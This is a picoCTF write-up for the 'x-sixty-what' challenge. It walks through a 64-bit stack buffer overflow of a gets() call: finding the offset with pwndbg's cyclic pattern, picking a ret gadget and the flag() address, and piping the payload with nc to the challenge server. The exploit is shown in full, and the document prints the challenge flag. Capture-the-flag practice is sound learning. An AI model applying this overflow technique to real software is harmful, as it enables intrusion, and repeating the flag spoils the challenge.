# x-sixty-what

Description
Overflow x64 code
Additional details will be available after launching your challenge instance.


---

so we are dealing with x64 binary ..

let's review the source code...

```c
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: vuln.c
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <string.h>
   4   │ #include <unistd.h>
   5   │ #include <sys/types.h>
   6   │ 
   7   │ #define BUFFSIZE 64
   8   │ #define FLAGSIZE 64
   9   │ 
  10   │ void flag() {
  11   │   char buf[FLAGSIZE];
  12   │   FILE *f = fopen("flag.txt","r");
  13   │   if (f == NULL) {
  14   │     printf("%s %s", "Please create 'flag.txt' in this directory with your",
  15   │                     "own debugging flag.\n");
  16   │     exit(0);
  17   │   }
  18   │ 
  19   │   fgets(buf,FLAGSIZE,f);
  20   │   printf(buf);
  21   │ }
  22   │ 
  23   │ void vuln(){
  24   │   char buf[BUFFSIZE];
  25   │   gets(buf);
  26   │ }
  27   │ 
  28   │ int main(int argc, char **argv){
  29   │ 
  30   │   setvbuf(stdout, NULL, _IONBF, 0);
  31   │   gid_t gid = getegid();
  32   │   setresgid(gid, gid, gid);
  33   │   puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  34   │   vuln();
  35   │   return 0;
  36   │ }
  37   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────
```

---

so we need to overflow gets to execute flag function to get the flag

This is a x64 binary so the payload will different from x32 bit.

padding + return pointer address + flag function address 



to find offset i'm gonna use gdb

```bash
❯ sudo gdb vuln
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 156 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from vuln...
(No debugging symbols found in vuln)
------- tip of the day (disable with set show-tips off) -------
GDB's follow-fork-mode parameter can be used to set whether to trace parent or child after fork() calls
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/lynk/picoCTF/x-sixty-what/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to 64-bit. Give me a string that gets you the flag: 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012d1 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*RAX  0x7fffffffe2f0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RBX  0x7fffffffe478 —▸ 0x7fffffffe6d7 ◂— '/home/lynk/picoCTF/x-sixty-what/vuln'
*RCX  0x7ffff7f9caa0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RDX  0x0
*RDI  0x7ffff7f9ea40 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x4052a1 ◂— 'aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
*R8   0x405305 ◂— 0x0
 R9   0x0
*R10  0x1000
*R11  0x246
 R12  0x0
*R13  0x7fffffffe488 —▸ 0x7fffffffe6fc ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 R14  0x0
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616169 ('iaaaaaaa')
*RSP  0x7fffffffe338 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x4012d1 (vuln+31) ◂— ret 
───────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x4012d1 <vuln+31>    ret    <0x616161616161616a>










─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp 0x7fffffffe338 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffe340 ◂— 'kaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffe348 ◂— 'laaaaaaamaaa'
03:0018│     0x7fffffffe350 ◂— 0x6161616d /* 'maaa' */
04:0020│     0x7fffffffe358 ◂— 0xf7ffdab0
05:0028│     0x7fffffffe360 ◂— 0x1
06:0030│     0x7fffffffe368 —▸ 0x7ffff7df06ca (__libc_start_call_main+122) ◂— mov edi, eax
07:0038│     0x7fffffffe370 —▸ 0x7fffffffe460 —▸ 0x7fffffffe468 —▸ 0x7ffff7fc3160 —▸ 0x7ffff7dc9000 ◂— ...
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0         0x4012d1 vuln+31
   1 0x616161616161616a
   2 0x616161616161616b
   3 0x616161616161616c
   4       0x6161616d
   5       0xf7ffdab0
   6              0x1
   7   0x7ffff7df06ca __libc_start_call_main+122
───────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
pwndbg>
```
offset is 72

Now we will find return pointer addres of a main function

```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004012d2 <+0>:	endbr64
   0x00000000004012d6 <+4>:	push   rbp
   0x00000000004012d7 <+5>:	mov    rbp,rsp
   0x00000000004012da <+8>:	sub    rsp,0x20
   0x00000000004012de <+12>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004012e1 <+15>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004012e5 <+19>:	mov    rax,QWORD PTR [rip+0x2d84]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x00000000004012ec <+26>:	mov    ecx,0x0
   0x00000000004012f1 <+31>:	mov    edx,0x2
   0x00000000004012f6 <+36>:	mov    esi,0x0
   0x00000000004012fb <+41>:	mov    rdi,rax
   0x00000000004012fe <+44>:	call   0x401120 <setvbuf@plt>
   0x0000000000401303 <+49>:	call   0x401110 <getegid@plt>
   0x0000000000401308 <+54>:	mov    DWORD PTR [rbp-0x4],eax
   0x000000000040130b <+57>:	mov    edx,DWORD PTR [rbp-0x4]
   0x000000000040130e <+60>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x0000000000401311 <+63>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401314 <+66>:	mov    esi,ecx
   0x0000000000401316 <+68>:	mov    edi,eax
   0x0000000000401318 <+70>:	mov    eax,0x0
   0x000000000040131d <+75>:	call   0x4010d0 <setresgid@plt>
   0x0000000000401322 <+80>:	lea    rdi,[rip+0xd3f]        # 0x402068
   0x0000000000401329 <+87>:	call   0x4010c0 <puts@plt>
   0x000000000040132e <+92>:	mov    eax,0x0
   0x0000000000401333 <+97>:	call   0x4012b2 <vuln>
   0x0000000000401338 <+102>:	mov    eax,0x0
   0x000000000040133d <+107>:	leave
   0x000000000040133e <+108>:	ret
End of assembler dump.
pwndbg>
```

return pointer address is ```0x000000000040133e```

Now address of the flag function

```bash
pwndbg> disass flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:	endbr64
   0x000000000040123a <+4>:	push   rbp
   0x000000000040123b <+5>:	mov    rbp,rsp
   0x000000000040123e <+8>:	sub    rsp,0x50
   0x0000000000401242 <+12>:	lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:	lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:	call   0x401130 <fopen@plt>
   0x0000000000401255 <+31>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:	jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:	lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:	lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:	lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:	mov    eax,0x0
   0x000000000040127a <+68>:	call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:	mov    edi,0x0
   0x0000000000401284 <+78>:	call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:	lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:	mov    esi,0x40
   0x0000000000401296 <+96>:	mov    rdi,rax
   0x0000000000401299 <+99>:	call   0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:	lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:	mov    rdi,rax
   0x00000000004012a5 <+111>:	mov    eax,0x0
   0x00000000004012aa <+116>:	call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:	nop
   0x00000000004012b0 <+122>:	leave
   0x00000000004012b1 <+123>:	ret
End of assembler dump.
pwndbg>
```

Address of the flag function is ```0x0000000000401236```

One thing to bear in mind we need to put all the addresses in reverse order let me show you..

```python
❯ python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwn
>>> "A" * 72
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> pwn.p64(0x000000000040133e)
b'>\x13@\x00\x00\x00\x00\x00'
>>> pwn.p64(0x0000000000401236)
b'6\x12@\x00\x00\x00\x00\x00'
```

it's time for the flag

```bash
❯ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>\x13@\x00\x00\x00\x00\x006\x12@\x00\x00\x00\x00\x00" | nc saturn.picoctf.net 60137

Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_d95e02b6}
```

---
flag:```picoCTF{b1663r_15_b3773r_d95e02b6}```


